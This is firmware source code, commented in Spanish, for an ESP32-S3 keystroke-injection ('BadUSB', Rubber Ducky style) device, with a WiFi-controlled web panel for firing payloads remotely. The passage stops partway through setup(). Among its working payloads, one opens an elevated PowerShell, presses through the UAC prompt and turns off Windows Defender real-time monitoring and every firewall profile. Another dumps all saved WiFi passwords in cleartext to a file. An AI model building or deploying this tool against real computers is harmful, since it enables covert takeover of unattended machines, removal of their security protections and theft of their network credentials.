#include "USB.h"
#include "USBHIDKeyboard.h"  // API TinyUSB para ESP32-S3
#include <WiFi.h>
#include <WebServer.h>
// Inicializar HID Keyboard en USB-OTG
USBHIDKeyboard Keyboard;
WebServer server(80);
// Credenciales WiFi
const char* ap_ssid = "paWi-Link";
const char* ap_password = "12345678";
// Variables de estado (usando char[] para evitar fragmentación)
char lastPayload[32] = "Ninguno";
int totalPayloads = 0;
bool payloadRunning = false;
unsigned long payloadStartTime = 0;
bool usbInitialized = false;  // ← Control de inicialización USB-OTG
// Constantes de tiempo
#define DELAY_INITIAL 5000
#define DELAY_SHORT 100
#define DELAY_MEDIUM 500
#define PAYLOAD_TIMEOUT 30000
#define REQUEST_COOLDOWN 1000
#define MAX_PAYLOAD_SIZE 4096
// Rate limiting
unsigned long lastRequestTime = 0;
// ============================================================================
// HARDWARE: Detección automática ESP32-S3
// ============================================================================
#if defined(ARDUINO_ESP32S3_DEV) || defined(CONFIG_IDF_TARGET_ESP32S3)
  #define IS_ESP32_S3 true
  // ESP32-S3: LED puede estar en GPIO 48 (RGB) o no tener LED
  #if defined(RGB_BUILTIN)
    #define LED_PIN RGB_BUILTIN
  #elif defined(LED_BUILTIN)
    #define LED_PIN LED_BUILTIN
  #else
    #define LED_PIN -1
  #endif
  #define USB_MANUFACTURER "Espressif"
  #define USB_PRODUCT "ESP32-S3 BadUSB"
  #define USB_SERIAL_NUMBER "ESP32S3-VROOM"
#else
  #define IS_ESP32_S3 false
  #define LED_PIN 2  // ESP32 clásico
#endif
// Debug mode
#define DEBUG_MODE true
#define DEBUG_PRINT(x) if(DEBUG_MODE) Serial.print(x)
#define DEBUG_PRINTLN(x) if(DEBUG_MODE) Serial.println(x)
// ============================================================================
// MAPEO DE TECLAS USB HID - COMPLETO
// ============================================================================
#define HID_KEY_A 0x04
#define HID_KEY_B 0x05
#define HID_KEY_C 0x06
#define HID_KEY_D 0x07
#define HID_KEY_E 0x08
#define HID_KEY_F 0x09
#define HID_KEY_G 0x0A
#define HID_KEY_H 0x0B
#define HID_KEY_I 0x0C
#define HID_KEY_J 0x0D
#define HID_KEY_K 0x0E
#define HID_KEY_L 0x0F
#define HID_KEY_M 0x10
#define HID_KEY_N 0x11
#define HID_KEY_O 0x12
#define HID_KEY_P 0x13
#define HID_KEY_Q 0x14
#define HID_KEY_R 0x15
#define HID_KEY_S 0x16
#define HID_KEY_T 0x17
#define HID_KEY_U 0x18
#define HID_KEY_V 0x19
#define HID_KEY_W 0x1A
#define HID_KEY_X 0x1B
#define HID_KEY_Y 0x1C
#define HID_KEY_Z 0x1D

#define HID_KEY_1 0x1E
#define HID_KEY_2 0x1F
#define HID_KEY_3 0x20
#define HID_KEY_4 0x21
#define HID_KEY_5 0x22
#define HID_KEY_6 0x23
#define HID_KEY_7 0x24
#define HID_KEY_8 0x25
#define HID_KEY_9 0x26
#define HID_KEY_0 0x27

#define HID_KEY_ENTER 0x28
#define HID_KEY_ESC 0x29
#define HID_KEY_BACKSPACE 0x2A
#define HID_KEY_TAB 0x2B
#define HID_KEY_SPACE 0x2C
#define HID_KEY_MINUS 0x2D
#define HID_KEY_EQUAL 0x2E
#define HID_KEY_LEFTBRACE 0x2F
#define HID_KEY_RIGHTBRACE 0x30
#define HID_KEY_BACKSLASH 0x31
#define HID_KEY_SEMICOLON 0x33
#define HID_KEY_APOSTROPHE 0x34
#define HID_KEY_GRAVE 0x35
#define HID_KEY_COMMA 0x36
#define HID_KEY_DOT 0x37
#define HID_KEY_SLASH 0x38

#define HID_KEY_F1 0x3A
#define HID_KEY_F2 0x3B
#define HID_KEY_F3 0x3C
#define HID_KEY_F4 0x3D
#define HID_KEY_F5 0x3E
#define HID_KEY_F6 0x3F
#define HID_KEY_F7 0x40
#define HID_KEY_F8 0x41
#define HID_KEY_F9 0x42
#define HID_KEY_F10 0x43
#define HID_KEY_F11 0x44
#define HID_KEY_F12 0x45

#define HID_KEY_INSERT 0x49
#define HID_KEY_HOME 0x4A
#define HID_KEY_PAGE_UP 0x4B
#define HID_KEY_DELETE 0x4C
#define HID_KEY_END 0x4D
#define HID_KEY_PAGE_DOWN 0x4E
#define HID_KEY_RIGHT 0x4F
#define HID_KEY_LEFT 0x50
#define HID_KEY_DOWN 0x51
#define HID_KEY_UP 0x52

#define HID_MOD_LCTRL  0x01
#define HID_MOD_LSHIFT 0x02
#define HID_MOD_LALT   0x04
#define HID_MOD_LGUI   0x08
#define HID_MOD_RCTRL  0x10
#define HID_MOD_RSHIFT 0x20
#define HID_MOD_RALT   0x40
#define HID_MOD_RGUI   0x80
// ============================================================================
// MAPEO DE TECLAS LATAM (Latinoamérica)
// Estructura para mapeo ASCII -> HID con teclado LATAM
// ============================================================================
struct KeyMapping {
  char ascii;
  uint8_t hidCode;
  uint8_t modifier;
};
// MAPEO COMPLETO PARA TECLADO LATAM (ordenado por ASCII 0x20-0x7E)
const KeyMapping keyMap[] PROGMEM = {
  // Espacio y símbolos básicos
  {' ', HID_KEY_SPACE, 0},                      // 0x20
  {'!', HID_KEY_1, HID_MOD_LSHIFT},             // 0x21
  {'"', HID_KEY_2, HID_MOD_LSHIFT},             // 0x22
  {'#', HID_KEY_3, HID_MOD_LSHIFT},             // 0x23
  {'$', HID_KEY_4, HID_MOD_LSHIFT},             // 0x24
  {'%', HID_KEY_5, HID_MOD_LSHIFT},             // 0x25
  {'&', HID_KEY_6, HID_MOD_LSHIFT},             // 0x26
  {'\'', HID_KEY_MINUS, 0},                     // 0x27
  {'(', HID_KEY_8, HID_MOD_LSHIFT},             // 0x28
  {')', HID_KEY_9, HID_MOD_LSHIFT},             // 0x29
  {'*', HID_KEY_EQUAL, HID_MOD_LSHIFT},         // 0x2A
  {'+', HID_KEY_RIGHTBRACE, 0},                 // 0x2B
  {',', HID_KEY_COMMA, 0},                      // 0x2C
  {'-', HID_KEY_SLASH, 0},                      // 0x2D
  {'.', HID_KEY_DOT, 0},                        // 0x2E
  {'/', HID_KEY_7, HID_MOD_LSHIFT},             // 0x2F
  // Números
  {'0', HID_KEY_0, 0},                          // 0x30
  {'1', HID_KEY_1, 0},
  {'2', HID_KEY_2, 0},
  {'3', HID_KEY_3, 0},
  {'4', HID_KEY_4, 0},
  {'5', HID_KEY_5, 0},
  {'6', HID_KEY_6, 0},
  {'7', HID_KEY_7, 0},
  {'8', HID_KEY_8, 0},
  {'9', HID_KEY_9, 0},                          // 0x39
  // Símbolos adicionales
  {':', HID_KEY_DOT, HID_MOD_LSHIFT},           // 0x3A
  {';', HID_KEY_COMMA, HID_MOD_LSHIFT},         // 0x3B
  {'<', HID_KEY_GRAVE, 0},                      // 0x3C
  {'=', HID_KEY_0, HID_MOD_LSHIFT},             // 0x3D
  {'>', HID_KEY_GRAVE, HID_MOD_LSHIFT},         // 0x3E
  {'?', HID_KEY_MINUS, HID_MOD_LSHIFT},         // 0x3F
  {'@', HID_KEY_2, HID_MOD_RALT},               // 0x40
  // Letras mayúsculas (A-Z)
  {'A', HID_KEY_A, HID_MOD_LSHIFT},             // 0x41
  {'B', HID_KEY_B, HID_MOD_LSHIFT},
  {'C', HID_KEY_C, HID_MOD_LSHIFT},
  {'D', HID_KEY_D, HID_MOD_LSHIFT},
  {'E', HID_KEY_E, HID_MOD_LSHIFT},
  {'F', HID_KEY_F, HID_MOD_LSHIFT},
  {'G', HID_KEY_G, HID_MOD_LSHIFT},
  {'H', HID_KEY_H, HID_MOD_LSHIFT},
  {'I', HID_KEY_I, HID_MOD_LSHIFT},
  {'J', HID_KEY_J, HID_MOD_LSHIFT},
  {'K', HID_KEY_K, HID_MOD_LSHIFT},
  {'L', HID_KEY_L, HID_MOD_LSHIFT},
  {'M', HID_KEY_M, HID_MOD_LSHIFT},
  {'N', HID_KEY_N, HID_MOD_LSHIFT},
  {'O', HID_KEY_O, HID_MOD_LSHIFT},
  {'P', HID_KEY_P, HID_MOD_LSHIFT},
  {'Q', HID_KEY_Q, HID_MOD_LSHIFT},
  {'R', HID_KEY_R, HID_MOD_LSHIFT},
  {'S', HID_KEY_S, HID_MOD_LSHIFT},
  {'T', HID_KEY_T, HID_MOD_LSHIFT},
  {'U', HID_KEY_U, HID_MOD_LSHIFT},
  {'V', HID_KEY_V, HID_MOD_LSHIFT},
  {'W', HID_KEY_W, HID_MOD_LSHIFT},
  {'X', HID_KEY_X, HID_MOD_LSHIFT},
  {'Y', HID_KEY_Y, HID_MOD_LSHIFT},
  {'Z', HID_KEY_Z, HID_MOD_LSHIFT},             // 0x5A
  // Símbolos con SHIFT
  {'[', HID_KEY_LEFTBRACE, HID_MOD_RALT},       // 0x5B
  {'\\', HID_KEY_GRAVE, HID_MOD_RALT},          // 0x5C
  {']', HID_KEY_RIGHTBRACE, HID_MOD_RALT},      // 0x5D
  {'^', HID_KEY_LEFTBRACE, HID_MOD_LSHIFT},     // 0x5E
  {'_', HID_KEY_SLASH, HID_MOD_LSHIFT},         // 0x5F
  {'`', HID_KEY_LEFTBRACE, 0},                  // 0x60
  // Letras minúsculas (a-z)
  {'a', HID_KEY_A, 0},                          // 0x61
  {'b', HID_KEY_B, 0},
  {'c', HID_KEY_C, 0},
  {'d', HID_KEY_D, 0},
  {'e', HID_KEY_E, 0},
  {'f', HID_KEY_F, 0},
  {'g', HID_KEY_G, 0},
  {'h', HID_KEY_H, 0},
  {'i', HID_KEY_I, 0},
  {'j', HID_KEY_J, 0},
  {'k', HID_KEY_K, 0},
  {'l', HID_KEY_L, 0},
  {'m', HID_KEY_M, 0},
  {'n', HID_KEY_N, 0},
  {'o', HID_KEY_O, 0},
  {'p', HID_KEY_P, 0},
  {'q', HID_KEY_Q, 0},
  {'r', HID_KEY_R, 0},
  {'s', HID_KEY_S, 0},
  {'t', HID_KEY_T, 0},
  {'u', HID_KEY_U, 0},
  {'v', HID_KEY_V, 0},
  {'w', HID_KEY_W, 0},
  {'x', HID_KEY_X, 0},
  {'y', HID_KEY_Y, 0},
  {'z', HID_KEY_Z, 0},                          // 0x7A
  // Símbolos finales
  {'{', HID_KEY_APOSTROPHE, HID_MOD_RALT},      // 0x7B
  {'|', HID_KEY_1, HID_MOD_RALT},               // 0x7C
  {'}', HID_KEY_SEMICOLON, HID_MOD_RALT},       // 0x7D
  {'~', HID_KEY_4, HID_MOD_RALT},               // 0x7E
  // Caracteres de control
  {'\n', HID_KEY_ENTER, 0},
  {'\r', HID_KEY_ENTER, 0},
  {'\t', HID_KEY_TAB, 0},
};
const int keyMapSize = sizeof(keyMap) / sizeof(KeyMapping);
// Variables de caché para optimización
static char lastChar = 0;
static int lastIndex = -1;
// ============================================================================
// FUNCIONES DE BAJO NIVEL HID
// ============================================================================
// Enviar reporte HID usando la API correcta de USBHIDKeyboard
inline void sendKeyReport(uint8_t key, uint8_t modifier) {
  KeyReport report = {0};
  report.modifiers = modifier;
  report.keys[0] = key;
  Keyboard.sendReport(&report);
  delay(5);
}
// Liberar todas las teclas
inline void releaseKey() {
  KeyReport report = {0};
  Keyboard.sendReport(&report);
  delay(2);
}
// Procesar una tecla del mapeo
inline void processKey(const KeyMapping& km) {
  sendKeyReport(km.hidCode, km.modifier);
  releaseKey();
}
// ============================================================================
// BÚSQUEDA BINARIA OPTIMIZADA O(log n)
// ============================================================================
void writeCharHID(char c) {
  // Validar rango ASCII
  if (c < 0x20 || c > 0x7E) {
    if (c != '\n' && c != '\r' && c != '\t') {
      DEBUG_PRINTLN("[WARN] Carácter no-ASCII ignorado: 0x" + String(c, HEX));
      return;
    }
  }
  // Cache: verificar si es el mismo carácter
  if (c == lastChar && lastIndex >= 0 && lastIndex < keyMapSize) {
    KeyMapping km;
    memcpy_P(&km, &keyMap[lastIndex], sizeof(KeyMapping));
    processKey(km);
    return;
  }
  // Búsqueda binaria O(log n)
  int left = 0;
  int right = keyMapSize - 1;
  while (left <= right) {
    int mid = left + (right - left) / 2;
    KeyMapping km;
    memcpy_P(&km, &keyMap[mid], sizeof(KeyMapping));
    if (km.ascii == c) {
      lastChar = c;
      lastIndex = mid;
      processKey(km);
      return;
    } else if (km.ascii < c) {
      left = mid + 1;
    } else {
      right = mid - 1;
    }
  }
  DEBUG_PRINTLN("[WARN] Carácter no mapeado: '" + String(c) + "' (0x" + String(c, HEX) + ")");
}
// ============================================================================
// PROCESAMIENTO DE ESCAPES (\n, \t, etc.)
// ============================================================================
String processEscapes(String str) {
  String result = "";
  result.reserve(str.length());
  for (unsigned int i = 0; i < str.length(); i++) {
    if (str[i] == '\\' && i + 1 < str.length()) {
      char next = str[i + 1];
      switch(next) {
        case 'n': result += '\n'; i++; break;
        case 't': result += '\t'; i++; break;
        case 'r': result += '\r'; i++; break;
        case '"': result += '"'; i++; break;
        case '\'': result += '\''; i++; break;
        case '\\': result += '\\'; i++; break;
        default: result += str[i]; break;
      }
    } else {
      result += str[i];
    }
  }
  return result;
}
// ============================================================================
// ESCRIBIR STRING CON PROCESAMIENTO DE ESCAPES
// ============================================================================
void writeStringHID(String str) {
  DEBUG_PRINTLN("  [HID] Escribiendo " + String(str.length()) + " chars");
  str = processEscapes(str);
  for (unsigned int i = 0; i < str.length(); i++) {
    writeCharHID(str.charAt(i));
    if (i % 5 == 0) {
      yield();
    }
  }
  DEBUG_PRINTLN("  [HID] ✓ Completado");
}
// ============================================================================
// PARSER DE TECLAS ESPECIALES (F1-F12, flechas, etc.)
// ============================================================================
uint8_t parseSpecialKey(String keyStr) {
  keyStr.toLowerCase();
  keyStr.trim();
  // Teclas de función F1-F12
  if (keyStr.startsWith("f")) {
    int fNum = keyStr.substring(1).toInt();
    if (fNum >= 1 && fNum <= 12) {
      return HID_KEY_F1 + (fNum - 1);
    }
  } 
  // Teclas especiales
  if (keyStr == "tab") return HID_KEY_TAB;
  if (keyStr == "enter") return HID_KEY_ENTER;
  if (keyStr == "esc" || keyStr == "escape") return HID_KEY_ESC;
  if (keyStr == "space") return HID_KEY_SPACE;
  if (keyStr == "backspace") return HID_KEY_BACKSPACE;
  if (keyStr == "delete" || keyStr == "del") return HID_KEY_DELETE;
  if (keyStr == "insert") return HID_KEY_INSERT;
  if (keyStr == "home") return HID_KEY_HOME;
  if (keyStr == "end") return HID_KEY_END;
  if (keyStr == "pageup" || keyStr == "pgup") return HID_KEY_PAGE_UP;
  if (keyStr == "pagedown" || keyStr == "pgdown") return HID_KEY_PAGE_DOWN;
  if (keyStr == "up" || keyStr == "uparrow") return HID_KEY_UP;
  if (keyStr == "down" || keyStr == "downarrow") return HID_KEY_DOWN;
  if (keyStr == "left" || keyStr == "leftarrow") return HID_KEY_LEFT;
  if (keyStr == "right" || keyStr == "rightarrow") return HID_KEY_RIGHT;
  // Números y letras individuales
  if (keyStr.length() == 1) {
    char c = keyStr.charAt(0);
    if (c >= '0' && c <= '9') {
      return (c == '0') ? HID_KEY_0 : (HID_KEY_1 + (c - '1'));
    }
    if (c >= 'a' && c <= 'z') {
      return HID_KEY_A + (c - 'a');
    }
  }
  return 0;
}
// ============================================================================
// PÁGINA WEB MEJORADA CON DESCRIPCIONES DE PAYLOADS
// ============================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>paWi Control v2.2</title>
<style>
:root{--bg-dark:#1c1c24;--bg-container:#282834;--bg-header:#2a3a50;--acc-main:#5b84c8;--acc-light:#92b4f4;--acc-success:#4caf50;--txt-main:#e0e0e0;--txt-log:#a9a9a9;--warn-bg:#473418;--warn-border:#ff9800;--warn-txt:#fff8e1;}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:linear-gradient(135deg,var(--bg-dark),#111115);min-height:100vh;padding:20px;color:var(--txt-main)}
.container{max-width:850px;margin:0 auto;background:var(--bg-container);border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,.4);overflow:hidden;border:1px solid #333}
.header{background:linear-gradient(135deg,var(--bg-header),#1e2c40);color:var(--txt-main);padding:30px;text-align:center;border-bottom:3px solid var(--acc-main)}
.header h1{font-size:1.8em;margin-bottom:8px}
.header p{opacity:.8}
.status{background:rgba(255,255,255,.08);padding:12px;margin-top:15px;border-radius:8px;display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px;text-align:center;font-size:0.9em}
.status div{padding:4px}
.content{padding:25px}
.section{margin-bottom:25px}
.section-title{font-size:1.3em;color:var(--txt-log);margin-bottom:12px;padding-bottom:6px;border-bottom:1px solid var(--acc-main);font-weight:600}
.payload-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px}
.payload-card{background:var(--bg-header);border-radius:8px;overflow:hidden;transition:transform .2s,box-shadow .2s;border:1px solid #333}
.payload-card:hover{transform:translateY(-3px);box-shadow:0 6px 15px rgba(0,0,0,.5);background:var(--acc-main)}
.payload-btn{width:100%;background:none;color:var(--txt-main);border:none;padding:15px;cursor:pointer;font-size:.9em;font-weight:600;text-align:left;transition:color .2s}
.payload-card:hover .payload-btn{color:#fff}
.payload-btn:disabled{opacity:.4;cursor:not-allowed}
.payload-icon{font-size:1.5em;margin-bottom:5px;display:block;opacity:.9}
.payload-desc{font-size:.7em;font-weight:400;opacity:.7;margin-top:3px;line-height:1.2}
textarea{width:100%;min-height:120px;padding:12px;border:1px solid var(--border-main);border-radius:6px;font-family:'Courier New',monospace;font-size:13px;background:#111115;color:var(--acc-light);resize:vertical}
.execute-btn{width:100%;margin-top:12px;padding:12px;background:linear-gradient(135deg,var(--acc-success),#1e8449);color:#fff;border:none;border-radius:6px;font-size:1em;font-weight:700;cursor:pointer;box-shadow:0 4px 8px rgba(76, 175, 80, 0.3)}
.execute-btn:hover{opacity:.9}
.log{background:#111115;color:var(--txt-log);padding:12px;border-radius:6px;font-family:'Courier New',monospace;font-size:12px;max-height:180px;overflow-y:auto;border:1px solid #333}
.log-entry{margin-bottom:4px;padding:4px;border-left:2px solid var(--acc-light);padding-left:8px}
.warning{background:var(--warn-bg);border:1px solid var(--warn-border);padding:12px;border-radius:6px;margin-bottom:15px;color:var(--warn-txt);font-size:0.9em;text-align:center}
.v22{background:linear-gradient(135deg,#5b84c8 0%,#3e5c9a 100%);color:var(--txt-main);padding:8px;border-radius:6px;margin-top:8px;font-size:0.8em}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1> paWi Control </h1>
<p>Sistema de Control HID Remoto</p>
<div class="status">
<div><strong>Estado:</strong> <span id="estado">🟢 Listo</span></div>
<div><strong>IP:</strong> 192.168.4.1</div>
<div><strong>Último:</strong> <span id="last">Ninguno</span></div>
<div><strong>Total:</strong> <span id="total">0</span></div>
</div>
</div>
<div class="content">
<div class="warning">⚠️ <strong>Importante:</strong> Espera 5 segundos entre payloads para que se ejecuten correctamente.</div>
<div class="section">
<div class="section-title">⚡ Payloads Predefinidos</div>
<div class="payload-grid">
<div class="payload-card">
<button class="payload-btn" onclick="exec(1)"><span class="payload-icon">📝</span>
<div>Notepad</div></button></div>
<div class="payload-card">
<button class="payload-btn" onclick="exec(2)"><span class="payload-icon">💻</span>
<div>System Info</div></button></div>
<div class="payload-card">
<button class="payload-btn" onclick="exec(3)"><span class="payload-icon">📦</span>
<div>Clone GitHub</div></button></div>
<div class="payload-card">
<button class="payload-btn" onclick="exec(4)"><span class="payload-icon">🌐</span>
<div>Abrir URL</div></button></div>
<div class="payload-card">
<button class="payload-btn" onclick="exec(5)"><span class="payload-icon">🛡️</span>
<div>Defender OFF</div></button></div>
<div class="payload-card">
<button class="payload-btn" onclick="exec(6)"><span class="payload-icon">📡</span>
<div>WiFi Pass</div></button></div>
</div>
</div>
<div class="section">
<div class="section-title">✏️ Payload Personalizado (Max 4KB)</div>
<textarea id="custom" placeholder="GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
STRING Hola desde paWi!"></textarea>
<button class="execute-btn" onclick="execCustom()">▶️ Ejecutar Payload Personalizado</button>
</div>
<div class="section">
<div class="section-title">📋 Log del Sistema</div>
<div class="log" id="log">
<div class="log-entry">[SISTEMA] paWi Control iniciado </div>
</div>
</div>
</div>
</div>
<script>
let executing=false;
function addLog(msg){
const log=document.getElementById('log');
const time=new Date().toLocaleTimeString();
log.innerHTML+=`<div class="log-entry">[${time}] ${msg}</div>`;
log.scrollTop=log.scrollHeight;
}
function disableButtons(disabled){
executing=disabled;
document.getElementById('estado').innerHTML=disabled?'🟡 Ejecutando...':'🟢 Listo';
const buttons=document.querySelectorAll('.payload-btn, .execute-btn');
buttons.forEach(btn=>btn.disabled=disabled);
}
function exec(id){
if(executing){
addLog('⚠️ Espera a que termine el payload actual');
return;
}
addLog('▶️ Ejecutando payload #'+id+'...');
disableButtons(true);
fetch('/execute?id='+id)
.then(r=>r.text())
.then(data=>{
addLog('✓ '+data);
setTimeout(()=>{
updateStatus();
disableButtons(false);
},1000);
})
.catch(e=>{
addLog('❌ Error de conexión');
disableButtons(false);
});
}
function execCustom(){
if(executing){
addLog('⚠️ Espera a que termine el payload actual');
return;
}
const payload=document.getElementById('custom').value;
if(!payload.trim()){
addLog('❌ Error: Payload vacío');
return;
}
if(payload.length>4096){
addLog('❌ Error: Payload demasiado grande (max 4KB)');
return;
}
addLog('▶️ Ejecutando payload personalizado...');
disableButtons(true);
fetch('/custom',{method:'POST',body:payload})
.then(r=>r.text())
.then(data=>{
addLog('✓ '+data);
setTimeout(()=>{
updateStatus();
disableButtons(false);
},1000);
})
.catch(e=>{
addLog('❌ Error de conexión');
disableButtons(false);
});
}
function updateStatus(){
fetch('/status')
.then(r=>r.json())
.then(data=>{
document.getElementById('last').textContent=data.last;
document.getElementById('total').textContent=data.total;
})
.catch(e=>console.log('Status error:',e));
}
setInterval(updateStatus,5000);
setTimeout(()=>{
updateStatus();
addLog('✓ Conectado a paWi - ESP32');
},1000);
</script>
</body>
</html>
)rawliteral";
// ============================================================================
// FUNCIONES AUXILIARES
// ============================================================================
// Control de LED
inline void setLED(bool state) {
  if (LED_PIN >= 0) {
    digitalWrite(LED_PIN, state ? HIGH : LOW);
  }
}
// Inicialización bajo demanda de USB-OTG
void initUSBOTG() {
  if (usbInitialized) {
    return;
  }
  #if IS_ESP32_S3
    Serial.println("\n[USB-OTG] Inicializando...");
    USB.VID(0x303A);
    USB.PID(0x8002);
    USB.productName(USB_PRODUCT);
    USB.manufacturerName(USB_MANUFACTURER);
    USB.serialNumber(USB_SERIAL_NUMBER);
    USB.begin();
    delay(1000);
    Keyboard.begin();
    delay(500);
    usbInitialized = true;
    Serial.println("[USB-OTG] ✓ Inicializado\n");
  #else
    Keyboard.begin();
    USB.begin();
    usbInitialized = true;
  #endif
}
// ============================================================================
// FUNCIONES HELPER PARA PAYLOADS
// ============================================================================
// Abrir diálogo Ejecutar (Win+R)
void openRunDialog() {
  sendKeyReport(HID_KEY_R, HID_MOD_LGUI);
  releaseKey();
  delay(DELAY_MEDIUM);
}
// Presionar Enter
void pressEnter() {
  sendKeyReport(HID_KEY_ENTER, 0);
  releaseKey();
  delay(50);
}
// ============================================================================
// PAYLOADS MEJORADOS - ADAPTADOS AL CÓDIGO
// ============================================================================
// PAYLOAD 1: ASCII ART + INFORMACIÓN EN NOTEPAD
// =====================================================
void payload_Notepad() {

  openRunDialog();
  writeStringHID("notepad");
  pressEnter();
  delay(1500);

  // --- ASCII ART paWi ---
  writeStringHID("               __    __  _ "); pressEnter();
  writeStringHID(" _ __    __ _ / / /\ \ \(_)"); pressEnter();
  writeStringHID("| '_ \  / _` |\ \/  \/ /| |"); pressEnter();
  writeStringHID("| |_) || (_| | \  /\  / | |"); pressEnter();
  writeStringHID("| .__/  \__,_|  \/  \/  |_|"); pressEnter();
  writeStringHID("|_|"); pressEnter();
  pressEnter();

  // --- Encabezado ---
  writeStringHID("========================================"); pressEnter();
  writeStringHID("   paWi Control System ");              pressEnter();
  writeStringHID("========================================"); pressEnter();
  pressEnter();

  // --- Texto informativo ---
  writeStringHID("Soy un Rubber Ducky mejorado");         pressEnter();
  writeStringHID("con inyeccion WiFi integrada");         pressEnter();
  writeStringHID("Puedo ejecutar payloads remotos");      pressEnter();
  writeStringHID("y enviar comandos desde la red.");       pressEnter();
  writeStringHID(":p");                                    pressEnter();
  pressEnter();

  // --- Estado ---
  writeStringHID("Control remoto WiFi activo!");          pressEnter();
  writeStringHID("Sistema: ESP32-S3 en modo HID");         pressEnter();
}

// PAYLOAD 2: INFORMACIÓN DEL SISTEMA (CMD)
// =====================================================
void payload_CMD() {
  openRunDialog();
  writeStringHID("cmd");
  pressEnter();
  delay(DELAY_MEDIUM);

  writeStringHID("echo ======================================== && echo    DIAGNOSTICO DEL SISTEMA && echo ======================================== && echo."); pressEnter();
  writeStringHID("echo [*] Usuario: && whoami && echo."); pressEnter();
  writeStringHID("echo [*] Equipo: && hostname && echo."); pressEnter();
  writeStringHID("echo [*] IP: && ipconfig | findstr IPv4 && echo."); pressEnter();
  writeStringHID("echo [*] Fecha: %date% %time% && echo."); pressEnter();
  writeStringHID("echo ======================================== && echo [+] Diagnostico completado && pause"); pressEnter();
}

// PAYLOAD 3: CLONAR REPOSITORIO USANDO POWERSHELL
// =====================================================
void payload_GitClone() {
  openRunDialog();
  writeStringHID("powershell");
  pressEnter();
  delay(1000);

  writeStringHID("Write-Host '========================================' -Fore Cyan; Write-Host '  CLONADOR DE GITHUB' -Fore Cyan; Write-Host '========================================' -Fore Cyan"); pressEnter();
  writeStringHID("if (Get-Command git -EA SilentlyContinue) {"); pressEnter();
  writeStringHID("  cd $env:USERPROFILE\\Desktop; git clone https://github.com/hak5/usbrubberducky-payloads.git; Write-Host '[+] Repo clonado!' -Fore Green; explorer .\\usbrubberducky-payloads"); pressEnter();
  writeStringHID("} else {"); pressEnter();
  writeStringHID("  Write-Host '[!] Git no encontrado. Instalar con: winget install Git.Git' -Fore Red"); pressEnter();
  writeStringHID("}"); pressEnter();
}

// PAYLOAD 4: ABRIR URL
// =====================================================
void payload_URL() {
  openRunDialog();
  writeStringHID("https://cybersen.online/");
  pressEnter();
}

// PAYLOAD 5: DESACTIVAR DEFENDER Y FIREWALL (ADMIN)
// =====================================================
void payload_DisableProtection() {
  openRunDialog();
  writeStringHID("powershell Start-Process powershell -Verb RunAs");
  pressEnter();
  delay(2000);

  // UAC bypass (Alt+Y para español, Alt+Left para inglés)
  sendKeyReport(HID_KEY_Y, HID_MOD_LALT);
  releaseKey();
  delay(1500);

  writeStringHID("Write-Host '========================================' -Fore Red; Write-Host ' DESACTIVACION DE PROTECCIONES' -Fore Red; Write-Host '========================================' -Fore Red"); pressEnter();
  
  writeStringHID("Write-Host '[*] Desactivando Defender...' -Fore Yellow; Set-MpPreference -DisableRealtimeMonitoring $true"); pressEnter();
  delay(500);
  
  writeStringHID("Write-Host '[*] Desactivando Firewall...' -Fore Yellow; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"); pressEnter();
  delay(500);
  
  writeStringHID("Write-Host '[+] Protecciones desactivadas' -Fore Green; Write-Host '[!] Sistema vulnerable - Reactivar ASAP' -Fore Red"); pressEnter();
  writeStringHID("Get-NetFirewallProfile | Select Name,Enabled"); pressEnter();
}

// PAYLOAD 6: EXPORTAR CONTRASEÑAS WIFI
// =====================================================
void payload_WiFiExport() {
  openRunDialog();
  writeStringHID("cmd");
  pressEnter();
  delay(DELAY_MEDIUM);

  writeStringHID("echo ======================================== && echo    EXPORTADOR DE REDES WIFI && echo ======================================== && echo."); pressEnter();
  writeStringHID("cd %TEMP% && echo === PERFILES WIFI === > wifi_passwords.txt && echo. >> wifi_passwords.txt"); pressEnter();
  writeStringHID("for /f \"skip=9 tokens=1,2 delims=:\" %i in ('netsh wlan show profiles') do @netsh wlan show profiles %j key=clear >> wifi_passwords.txt"); pressEnter();
  delay(2000);
  writeStringHID("echo. && echo [+] Archivo: %TEMP%\\wifi_passwords.txt && notepad wifi_passwords.txt"); pressEnter();
}

// ============================================================================
// SETUP
// ============================================================================
void setup() {
  if (LED_PIN >= 0) {
    pinMode(LED_PIN, OUTPUT);
  }
  delay(1000);
  Serial.begin(115200);
  delay(2000);
  Serial.println("\n\n========================================");
  #if IS_ESP32_S3
    Serial.println("paWi - ESP32-S3 ");
    Serial.println("Chip: ESP32-S3 | USB: Native OTG");
  #else
    Serial.println("paWi - ESP32-S3");
  #endif
  Serial.println("========================================\n");
  // Test LED
  if (LED_PIN >= 0) {
    Serial.println("[0/3] Test LED...");
    for(int i = 0; i < 3; i++) {
      setLED(true);
      delay(200);
      setLED(false);
      delay(200);
    }
    Serial.println("      ✓ LED OK (GPIO " + String(LED_PIN) + ")\n");
  } else {
    Serial.println("[0/3] Sin LED integrado\n");
  }
  // WiFi
  Serial.println("[1/3] Iniciando WiFi...");
  WiFi.mode(WIFI_AP);
  bool apStarted = WiFi.softAP(ap_ssid, ap_password, 3, 0, 4);
  if (!apStarted) {
    Serial.println("      ❌ ERROR: WiFi falló");
    delay(1000);
    apStarted = WiFi.softAP(ap_ssid, ap_password);
    if (!apStarted) {
      Serial.println("      ❌ CRÍTICO: WiFi falló completamente");
      while(true) {
        setLED(true);
        delay(100);
        setLED(false);
        delay(100);
      }
    }
  }
  WiFi.setTxPower(WIFI_POWER_19_5dBm);
  delay(500);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("      SSID: ");
  Serial.println(ap_ssid);
  Serial.print("      Pass: ");
  Serial.println(ap_password);
  Serial.print("      IP: ");
  Serial.println(IP);
  Serial.println("      ✓ WiFi OK\n");
  // Servidor Web
  Serial.println("[2/3] Iniciando servidor...");
  setupServer();
  server.begin();
  Serial.println("      ✓ Servidor OK\n");
  // USB-OTG bajo demanda
  Serial.println("[3/3] USB-OTG en espera...");
  Serial.println("      ℹ️  Se inicializará con el primer payload");
